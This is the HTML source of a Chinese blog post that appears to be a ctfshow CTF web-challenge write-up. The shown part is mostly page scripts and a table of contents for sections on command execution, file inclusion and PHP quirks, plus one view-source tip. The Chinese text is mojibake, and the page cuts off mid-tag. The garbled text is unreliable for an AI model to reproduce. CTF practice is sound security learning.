<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ctfshow-Web1000È¢òÁ≥ªÂàó‰øÆÁÇº(‰∏Ä) | dota_st</title><meta name="keywords" content="CTF"><meta name="author" content="dota_st"><meta name="copyright" content="dota_st"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="¬∂ÂâçË®Ä Ëøô‰∏™webÁ≥ªÂàóÈ¢òÊòØÂâç‰∫õÊó•Â≠êÊàëÈöèÊÑèÈÄõÈÄõÁöÑÊó∂ÂÄôÔºåÂú®ctfshowÂπ≥Âè∞‰∏äÂèëÁé∞ÁöÑÔºåÊ≠£Â•ΩwebÂ§™Ëèú‰∫ÜÔºåÂÄüÁî±Ëøô‰∏™Á≥ªÂàóÈ¢òÂºÄÂßãËá™Êàë‰øÆÁÇºÂêßüòñ ¬∂‰ø°ÊÅØÊî∂ÈõÜ(1-20) ¬∂web1 Âè≥ÈîÆÊü•ÁúãÊ∫êÁ†ÅÂ∞±ËÉΩÁúãÂà∞flag  ¬∂web2 ÊâìÂºÄÁΩëÈ°µÊèêÁ§∫Êó†Ê≥ïÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåÂè≥ÈîÆ‰πü‰ΩøÁî®‰∏ç‰∫ÜÔºåÈÇ£Êàë‰ª¨Â∞±Âú®urlÂâçÈù¢Âä†‰∏äview-source: 1view-source:http:&#x2F;&#x2F;83a83588-671e-4a"><meta property="og:type" content="article"><meta property="og:title" content="ctfshow-Web1000È¢òÁ≥ªÂàó‰øÆÁÇº(‰∏Ä)"><meta property="og:url" content="https://www.wlhhlc.top/posts/14827/index.html"><meta property="og:site_name" content="dota_st"><meta property="og:description" content="¬∂ÂâçË®Ä Ëøô‰∏™webÁ≥ªÂàóÈ¢òÊòØÂâç‰∫õÊó•Â≠êÊàëÈöèÊÑèÈÄõÈÄõÁöÑÊó∂ÂÄôÔºåÂú®ctfshowÂπ≥Âè∞‰∏äÂèëÁé∞ÁöÑÔºåÊ≠£Â•ΩwebÂ§™Ëèú‰∫ÜÔºåÂÄüÁî±Ëøô‰∏™Á≥ªÂàóÈ¢òÂºÄÂßãËá™Êàë‰øÆÁÇºÂêßüòñ ¬∂‰ø°ÊÅØÊî∂ÈõÜ(1-20) ¬∂web1 Âè≥ÈîÆÊü•ÁúãÊ∫êÁ†ÅÂ∞±ËÉΩÁúãÂà∞flag  ¬∂web2 ÊâìÂºÄÁΩëÈ°µÊèêÁ§∫Êó†Ê≥ïÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåÂè≥ÈîÆ‰πü‰ΩøÁî®‰∏ç‰∫ÜÔºåÈÇ£Êàë‰ª¨Â∞±Âú®urlÂâçÈù¢Âä†‰∏äview-source: 1view-source:http:&#x2F;&#x2F;83a83588-671e-4a"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/dAEWUr.jpg"><meta property="article:published_time" content="2021-01-31T12:51:20.000Z"><meta property="article:modified_time" content="2021-05-01T08:42:12.380Z"><meta property="article:author" content="dota_st"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/dAEWUr.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/dota-st/blog_file/E595997D44EF7013BFD08323A4506527.png"><link rel="canonical" href="https://www.wlhhlc.top/posts/14827/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"Êâæ‰∏çÂà∞ÊÇ®Êü•ËØ¢ÁöÑÂÜÖÂÆπÔºö${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Â§çÂà∂ÊàêÂäü',
    error: 'Â§çÂà∂ÈîôËØØ',
    noSupport: 'ÊµèËßàÂô®‰∏çÊîØÊåÅ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'ÂàöÂàö',
    min: 'ÂàÜÈíüÂâç',
    hour: 'Â∞èÊó∂Ââç',
    day: 'Â§©Ââç',
    month: '‰∏™ÊúàÂâç'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE={isPost:!0,isHome:!1,isHighlightShrink:!1,isSidebar:!0,postUpdate:"2021-05-01 16:42:12"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dota-st/blog_file@2.03/background.min.css"><meta name="referrer" content="no-referrer-when-downgrade"><meta name="generator" content="Hexo 5.2.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@master/css/APlayer.min.css"><div id="aplayer"></div><script src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@master/js/APlayer.min.js"></script><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Âä†ËΩΩ‰∏≠...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://blog-file-1302856486.file.myqcloud.com/%E5%A4%B4%E5%83%8F.png" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">ÊñáÁ´†</div><div class="length_num">12</div></a></div></div><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/tags/"><div class="headline">Ê†áÁ≠æ</div><div class="length_num">5</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>È¶ñÈ°µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Êó∂Èó¥ËΩ¥</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Ê†áÁ≠æ</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i> <span>ÁïôË®ÄÊùø</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>ÂÖ≥‰∫éÊàë</span></a></div></div></div></div><div id="body-wrap"><div id="web_bg"></div><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">ÁõÆÂΩï</div><div class="sidebar-toc__progress"><span class="progress-notice">‰Ω†Â∑≤ÁªèËØª‰∫Ü</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">ÂâçË®Ä</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1-20"><span class="toc-number">2.</span> <span class="toc-text">‰ø°ÊÅØÊî∂ÈõÜ(1-20)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1"><span class="toc-number">2.1.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-number">2.2.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web3"><span class="toc-number">2.3.</span> <span class="toc-text">web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web4"><span class="toc-number">2.4.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5"><span class="toc-number">2.5.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web6"><span class="toc-number">2.6.</span> <span class="toc-text">web6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web7"><span class="toc-number">2.7.</span> <span class="toc-text">web7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web8"><span class="toc-number">2.8.</span> <span class="toc-text">web8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web9"><span class="toc-number">2.9.</span> <span class="toc-text">web9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web10"><span class="toc-number">2.10.</span> <span class="toc-text">web10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web11"><span class="toc-number">2.11.</span> <span class="toc-text">web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web12"><span class="toc-number">2.12.</span> <span class="toc-text">web12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web13"><span class="toc-number">2.13.</span> <span class="toc-text">web13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web14"><span class="toc-number">2.14.</span> <span class="toc-text">web14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web15"><span class="toc-number">2.15.</span> <span class="toc-text">web15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web16"><span class="toc-number">2.16.</span> <span class="toc-text">web16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web17"><span class="toc-number">2.17.</span> <span class="toc-text">web17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web18"><span class="toc-number">2.18.</span> <span class="toc-text">web18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web19"><span class="toc-number">2.19.</span> <span class="toc-text">web19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web20"><span class="toc-number">2.20.</span> <span class="toc-text">web20</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-21-28"><span class="toc-number">3.</span> <span class="toc-text">ÁàÜÁ†¥(21-28)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web21"><span class="toc-number">3.1.</span> <span class="toc-text">web21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web22"><span class="toc-number">3.2.</span> <span class="toc-text">web22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web23"><span class="toc-number">3.3.</span> <span class="toc-text">web23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web24"><span class="toc-number">3.4.</span> <span class="toc-text">web24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web25"><span class="toc-number">3.5.</span> <span class="toc-text">web25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web26"><span class="toc-number">3.6.</span> <span class="toc-text">web26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web27"><span class="toc-number">3.7.</span> <span class="toc-text">web27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web28"><span class="toc-number">3.8.</span> <span class="toc-text">web28</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-29-77-118-122-124"><span class="toc-number">4.</span> <span class="toc-text">ÂëΩ‰ª§ÊâßË°å(29-77&amp;118-122&amp;124)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web29"><span class="toc-number">4.1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web30"><span class="toc-number">4.2.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web31"><span class="toc-number">4.3.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web32"><span class="toc-number">4.4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web33"><span class="toc-number">4.5.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web34"><span class="toc-number">4.6.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web35"><span class="toc-number">4.7.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web36"><span class="toc-number">4.8.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web37"><span class="toc-number">4.9.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web38"><span class="toc-number">4.10.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web39"><span class="toc-number">4.11.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web40"><span class="toc-number">4.12.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web41"><span class="toc-number">4.13.</span> <span class="toc-text">web41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web42"><span class="toc-number">4.14.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web43"><span class="toc-number">4.15.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web44"><span class="toc-number">4.16.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web45"><span class="toc-number">4.17.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web46"><span class="toc-number">4.18.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web47"><span class="toc-number">4.19.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web48"><span class="toc-number">4.20.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web49"><span class="toc-number">4.21.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web50"><span class="toc-number">4.22.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web51"><span class="toc-number">4.23.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web52"><span class="toc-number">4.24.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web53"><span class="toc-number">4.25.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web54"><span class="toc-number">4.26.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web55"><span class="toc-number">4.27.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web56"><span class="toc-number">4.28.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web57"><span class="toc-number">4.29.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web58"><span class="toc-number">4.30.</span> <span class="toc-text">web58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web59"><span class="toc-number">4.31.</span> <span class="toc-text">web59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web60"><span class="toc-number">4.32.</span> <span class="toc-text">web60</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web61"><span class="toc-number">4.33.</span> <span class="toc-text">web61</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web62"><span class="toc-number">4.34.</span> <span class="toc-text">web62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web63"><span class="toc-number">4.35.</span> <span class="toc-text">web63</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web64"><span class="toc-number">4.36.</span> <span class="toc-text">web64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web65"><span class="toc-number">4.37.</span> <span class="toc-text">web65</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web66"><span class="toc-number">4.38.</span> <span class="toc-text">web66</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web67"><span class="toc-number">4.39.</span> <span class="toc-text">web67</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web68"><span class="toc-number">4.40.</span> <span class="toc-text">web68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web69"><span class="toc-number">4.41.</span> <span class="toc-text">web69</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web70"><span class="toc-number">4.42.</span> <span class="toc-text">web70</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web71"><span class="toc-number">4.43.</span> <span class="toc-text">web71</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web72"><span class="toc-number">4.44.</span> <span class="toc-text">web72</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web73"><span class="toc-number">4.45.</span> <span class="toc-text">web73</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web74"><span class="toc-number">4.46.</span> <span class="toc-text">web74</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web75"><span class="toc-number">4.47.</span> <span class="toc-text">web75</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web76"><span class="toc-number">4.48.</span> <span class="toc-text">web76</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web77"><span class="toc-number">4.49.</span> <span class="toc-text">web77</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web118"><span class="toc-number">4.50.</span> <span class="toc-text">web118</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web119"><span class="toc-number">4.51.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web120"><span class="toc-number">4.52.</span> <span class="toc-text">web120</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web121"><span class="toc-number">4.53.</span> <span class="toc-text">web121</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web122"><span class="toc-number">4.54.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web124"><span class="toc-number">4.55.</span> <span class="toc-text">web124</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-78-88-116-117"><span class="toc-number">5.</span> <span class="toc-text">Êñá‰ª∂ÂåÖÂê´(78-88&amp;116-117)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web78"><span class="toc-number">5.1.</span> <span class="toc-text">web78</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web79"><span class="toc-number">5.2.</span> <span class="toc-text">web79</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web80"><span class="toc-number">5.3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web81"><span class="toc-number">5.4.</span> <span class="toc-text">web81</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web82"><span class="toc-number">5.5.</span> <span class="toc-text">web82</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web83"><span class="toc-number">5.6.</span> <span class="toc-text">web83</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web84"><span class="toc-number">5.7.</span> <span class="toc-text">web84</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web85"><span class="toc-number">5.8.</span> <span class="toc-text">web85</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web86"><span class="toc-number">5.9.</span> <span class="toc-text">web86</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web87"><span class="toc-number">5.10.</span> <span class="toc-text">web87</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web88"><span class="toc-number">5.11.</span> <span class="toc-text">web88</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web116"><span class="toc-number">5.12.</span> <span class="toc-text">web116</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web117"><span class="toc-number">5.13.</span> <span class="toc-text">web117</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%89%B9%E6%80%A7-89-115-123-125-150"><span class="toc-number">6.</span> <span class="toc-text">phpÁâπÊÄß(89-115&amp;123&amp;125-150)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web89"><span class="toc-number">6.1.</span> <span class="toc-text">web89</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web90"><span class="toc-number">6.2.</span> <span class="toc-text">web90</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web91"><span class="toc-number">6.3.</span> <span class="toc-text">web91</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web92"><span class="toc-number">6.4.</span> <span class="toc-text">web92</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web93"><span class="toc-number">6.5.</span> <span class="toc-text">web93</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web94"><span class="toc-number">6.6.</span> <span class="toc-text">web94</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web95"><span class="toc-number">6.7.</span> <span class="toc-text">web95</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web96"><span class="toc-number">6.8.</span> <span class="toc-text">web96</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web97"><span class="toc-number">6.9.</span> <span class="toc-text">web97</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web98"><span class="toc-number">6.10.</span> <span class="toc-text">web98</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web99"><span class="toc-number">6.11.</span> <span class="toc-text">web99</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web100"><span class="toc-number">6.12.</span> <span class="toc-text">web100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web101"><span class="toc-number">6.13.</span> <span class="toc-text">web101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web102"><span class="toc-number">6.14.</span> <span class="toc-text">web102</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web103"><span class="toc-number">6.15.</span> <span class="toc-text">web103</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web104"><span class="toc-number">6.16.</span> <span class="toc-text">web104</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web105"><span class="toc-number">6.17.</span> <span class="toc-text">web105</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web106"><span class="toc-number">6.18.</span> <span class="toc-text">web106</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web107"><span class="toc-number">6.19.</span> <span class="toc-text">web107</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web108"><span class="toc-number">6.20.</span> <span class="toc-text">web108</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web109"><span class="toc-number">6.21.</span> <span class="toc-text">web109</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web110"><span class="toc-number">6.22.</span> <span class="toc-text">web110</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web111"><span class="toc-number">6.23.</span> <span class="toc-text">web111</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web112"><span class="toc-number">6.24.</span> <span class="toc-text">web112</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web113"><span class="toc-number">6.25.</span> <span class="toc-text">web113</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web114"><span class="toc-number">6.26.</span> <span class="toc-text">web114</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web115"><span class="toc-number">6.27.</span> <span class="toc-text">web115</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web123"><span class="toc-number">6.28.</span> <span class="toc-text">web123</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web125"><span class="toc-number">6.29.</span> <span class="toc-text">web125</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web126"><span class="toc-number">6.30.</span> <span class="toc-text">web126</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web127"><span class="toc-number">6.31.</span> <span class="toc-text">web127</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web128"><span class="toc-number">6.32.</span> <span class="toc-text">web128</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web129"><span class="toc-number">6.33.</span> <span class="toc-text">web129</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web130"><span class="toc-number">6.34.</span> <span class="toc-text">web130</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web131"><span class="toc-number">6.35.</span> <span class="toc-text">web131</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web132"><span class="toc-number">6.36.</span> <span class="toc-text">web132</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web133"><span class="toc-number">6.37.</span> <span class="toc-text">web133</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web134"><span class="toc-number">6.38.</span> <span class="toc-text">web134</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web135"><span class="toc-number">6.39.</span> <span class="toc-text">web135</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web136"><span class="toc-number">6.40.</span> <span class="toc-text">web136</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web137"><span class="toc-number">6.41.</span> <span class="toc-text">web137</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web138"><span class="toc-number">6.42.</span> <span class="toc-text">web138</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web139"><span class="toc-number">6.43.</span> <span class="toc-text">web139</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web140"><span class="toc-number">6.44.</span> <span class="toc-text">web140</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web141"><span class="toc-number">6.45.</span> <span class="toc-text">web141</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web142"><span class="toc-number">6.46.</span> <span class="toc-text">web142</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web143"><span class="toc-number">6.47.</span> <span class="toc-text">web143</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web144"><span class="toc-number">6.48.</span> <span class="toc-text">web144</span></a></li><li class="toc-item toc-level-3"><a 